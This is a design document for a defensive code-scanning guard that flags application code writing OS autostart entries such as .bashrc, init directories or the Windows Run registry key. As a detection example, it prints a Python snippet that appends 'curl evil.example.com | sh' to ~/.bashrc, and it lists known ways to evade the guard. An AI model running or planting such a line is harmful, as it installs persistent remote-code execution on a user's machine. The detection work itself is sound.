---
type: Guard
title: "autostart-persistence-mechanism"
description: "No OS-level autostart/persistence mechanism written from application code."
timestamp: "2026-10-07T00:00:00Z"
guard_id: "autostart-persistence-mechanism"
checklist_section: ["8"]
standards: ["OWASP:A08"]
---

# No OS-level autostart/persistence mechanism written from application code

_Author, 2026-10-07_

---

## The threat

Modifying a shell startup file, a system-wide init directory, or the Windows `Run`
registry key is how malware survives a reboot: a backdoored dependency or AI-agent
skill plants itself so it restarts automatically. Ordinary application code has
essentially no legitimate reason to touch any of these. OWASP:A08 (Software and Data
Integrity Failures), CWE-506 (Embedded Malicious Code).

## Why this guard fits the stack

Adapted from Datadog GuardDog's `threat-filesystem-autostart` source-code rule.
GuardDog screens third-party packages; this guard applies the same signatures to the
target application's own source:

```python
with open(os.path.expanduser("~/.bashrc"), "a") as f:
    f.write("curl evil.example.com | sh\n")     # fires: writing a shell startup file
```

```python
with open(os.path.expanduser("~/.bashrc"), "r") as f:
    "myapp-completion" in f.read()               # read-only, ordinary, silent
```

## Detection design

1. `applies()` gates on `python`, `javascript`, or `typescript` in `profile.features`.
2. Scans `.py`/`.pyi`/`.js`/`.ts`/`.jsx`/`.tsx`/`.mjs`/`.cjs`.
3. Three shapes:
   - `system-wide-startup-reference`: a literal reference to `/etc/init.d/`,
     `/etc/profile.d/`, or `~/.config/autostart/`: fires on reference alone, since
     even mentioning these root-owned, system-wide paths is unusual for application
     code.
   - `shell-config-write`: an actual file write/append (not a bare reference) to
     `.bashrc`/`.bash_profile`/`.profile`/`.zshrc`/`/etc/rc.local`, checked via a
     small window around the path reference for `open(..., "w"/"a")` (Python) or
     `fs.writeFile`/`fs.appendFile` (JS).
   - `windows-run-key-write`: `winreg.SetValueEx` in a file that also references the
     Windows `CurrentVersion\Run`/`RunOnce` registry path.
4. Suppress an audited case (a legitimate provisioning/dotfile tool) with a
   whole-file pragma comment anywhere in the file:
   `# security: allow-autostart-persistence-mechanism`.
5. All rules emit `severity="high"`, standards `["OWASP:A08", "CWE-506"]`.

## When NOT to flag

Reading a shell config file (checking whether a completion script is already
installed, for example) never fires: only an actual write/append does. The
system-wide-path rule is the one exception that fires on reference alone, since those
specific root-owned paths have essentially no legitimate read-only use in application
code either.

## Tests

| Test | What it checks |
|---|---|
| `test_fires_on_bashrc_write` | `.bashrc` write fires |
| `test_fires_on_js_profile_write` | JS `fs.appendFile` to `.profile` fires |
| `test_fires_on_system_wide_path_reference_alone` | `/etc/init.d/` reference alone fires |
| `test_fires_on_windows_run_key_write` | `winreg.SetValueEx` + Run-key path fires |
| `test_passes_bashrc_read_only` | read-only `.bashrc` access stays silent |
| `test_fires_on_one_line_open_of_expanduser_bashrc_for_append` | the one-liner `open(os.path.expanduser('~/.bashrc'), 'a')` fires (the nested call used to hide the mode, so the example above did not fire before PR #1048's review) |
| `test_passes_one_line_open_of_expanduser_bashrc_for_reading` | the same one-liner with `'r'`, and a default-mode `open(os.path.join(...))`, stay silent |
| `test_pragma_suppresses_whole_file` | whole-file pragma suppresses |
| `test_does_not_apply_with_no_relevant_stack` | `applies()` is `False` with no relevant feature |

## Known bypasses

Writing to the shell config via an indirect path (building the string from several
concatenated parts, or via a variable that isn't recognized by the small
proximity-window check), or using a less common persistence mechanism (systemd user
units, a cron entry), evades these specific signatures.

## What this guard does NOT prove

A clean scan does not rule out persistence via a mechanism this guard doesn't name:
cron, systemd timers/services, a login hook, a browser extension manifest. This guard
only covers the specific shell-dotfile/system-init-dir/Windows-registry shapes above.

# Citations

[1] agentsec checklist item `8-autostart-persistence-mechanism` (§8)
[2] OWASP:A08
[3] CWE-506
[4] Datadog GuardDog `threat-filesystem-autostart`: https://github.com/DataDog/guarddog
